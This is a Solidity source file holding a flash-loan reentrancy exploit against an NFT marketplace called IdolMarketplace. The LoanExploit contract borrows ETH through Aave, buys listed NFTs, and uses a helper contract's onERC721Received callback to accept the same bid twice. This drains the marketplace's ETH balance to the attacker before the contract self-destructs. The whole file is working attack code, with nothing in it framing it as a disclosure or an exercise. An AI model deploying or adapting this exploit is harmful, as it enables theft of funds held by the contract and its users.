pragma solidity ^0.6.6;

// import './IdolMarketplace.sol';

import "./aave/FlashLoanReceiverBase.sol";
import "./aave/ILendingPoolAddressesProvider.sol";
import "./aave/ILendingPool.sol";

contract IdolMarketplace {
    struct Listing {
        address seller; 
        uint minValue;
        address onlySellTo;
    }
    mapping (uint => Listing) public godListings;
    function buyGod(uint _godId) external payable {}
    function acceptBidForGod(uint _godId, uint _minPrice) external{}
    function withdrawPendingFunds() external{}
    function enterBidForGod(uint _godId) external payable{}
}

contract IdolMain {
    function ownerOf(uint) external returns(address) {}
    function safeTransferFrom(address from, address to, uint256 tokenId) external{}
    function approve(address to, uint256 tokenId) external {}
    function transferFrom(address from, address to, uint256 tokenId) external {}
}


contract LoanExploit is FlashLoanReceiverBaseV1 {
    uint[] nfts;
    IdolMarketplace public idolMarketplace;
    IdolMain public idolMain;
    address public ownerr;
    
    uint public borrowValue;

    constructor(address _addressProvider, address _idolMarketplace, address _idolMain) FlashLoanReceiverBaseV1(_addressProvider) public{
        idolMarketplace = IdolMarketplace(_idolMarketplace);
        idolMain = IdolMain(_idolMain);
        ownerr = msg.sender;
    }

    function attack(uint _borrowValue, uint[] memory _nfts) public onlyOwner {
        for (uint i = 0; i < _nfts.length; i++) {
            nfts.push(_nfts[i]);
        }
        borrowValue = _borrowValue;

        address _asset = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        bytes memory data = "";
        ILendingPoolV1 lendingPool = ILendingPoolV1(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _asset, _borrowValue, data);
    }

    function executeOperation( address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) external override {
        require(_amount <= getBalanceInternal(address(this), _reserve), "Invalid balance, was the flashLoan successful?");
        if ( address(this).balance >= borrowValue) {
            _buyNFT();
            _reentry();            

            uint totalDebt = _amount.add(_fee);
            transferFundsBackToPoolInternal(_reserve, totalDebt);
            _selfdestruct();
        }
    }

    function _buyNFT() private {
        for (uint i = 0; i < nfts.length; i++) {
            (address _seller, uint _price, ) = idolMarketplace.godListings(nfts[i]);
            if (_price > 0 && _seller == idolMain.ownerOf(nfts[i])) {
                idolMarketplace.buyGod{value: _price}(nfts[i]);
            }
        }
    }

    function _reentry() private {
        // choose the first `nfts` as exploit NFT
        uint choosedNFT = nfts[0];
        ExploitReceive exploitReceive = new ExploitReceive(choosedNFT, address(idolMarketplace), address(idolMain));

        // calculate bidPrice required to withdraw all ETH in IdolMarketplace
        uint bidPrice = address(idolMarketplace).balance * 1000 / 850;
        address(exploitReceive).call{value: bidPrice}("");

        // approve idolMarketplace to use your NFT and accept the bid
        idolMain.approve(address(idolMarketplace), choosedNFT);
        idolMarketplace.acceptBidForGod(choosedNFT, 0);

        idolMarketplace.withdrawPendingFunds();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        return 0x150b7a02; // ERC721_RECEIVED
    }

    function _selfdestruct() private {
        for (uint i = 0; i < nfts.length; i++) {
            idolMain.transferFrom(address(this), ownerr, nfts[i]);
        }
        selfdestruct(payable(ownerr));
    }

    function acceptBidAgain(uint _id) public {
        idolMarketplace.acceptBidForGod(_id, 0);
    }

    function mybalance() view public returns(uint256) 
    {
        return address(this).balance;
    }
}


contract ExploitReceive {
    IdolMarketplace public idolMarketplace;
    IdolMain public idolMain;
    LoanExploit public loanExploit;
    uint public id;
    bool public reentrancy;

    constructor(uint _id, address _idolMarketplace, address _idolMain) public {
        idolMarketplace = IdolMarketplace(payable(_idolMarketplace));
        idolMain = IdolMain(payable(_idolMain));
        loanExploit = LoanExploit(payable(msg.sender));
        id = _id;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        idolMain.transferFrom(address(this), address(loanExploit), id);
        if (reentrancy == false) {
            reentrancy = true;
            loanExploit.acceptBidAgain(id);
        }
        return 0x150b7a02;
    }

    fallback() external payable {
        idolMarketplace.enterBidForGod{value: msg.value}(id);
    }
}

